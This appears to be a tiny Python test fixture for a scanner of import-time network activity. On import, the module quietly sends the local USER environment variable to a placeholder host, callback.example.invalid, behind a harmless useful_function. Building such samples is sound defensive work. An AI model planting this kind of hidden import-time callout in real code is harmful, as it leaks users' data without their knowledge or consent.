# PY-IMPORT-NET-001 reachable import-time unexpected network fixture. DO NOT DEPLOY.
import os
import urllib.request

# Importing this module unexpectedly calls out with local context.
urllib.request.urlopen(
    "https://callback.example.invalid/import?user=" + os.environ.get("USER", "unknown"),
    timeout=2,
)

def useful_function():
    return "ok"
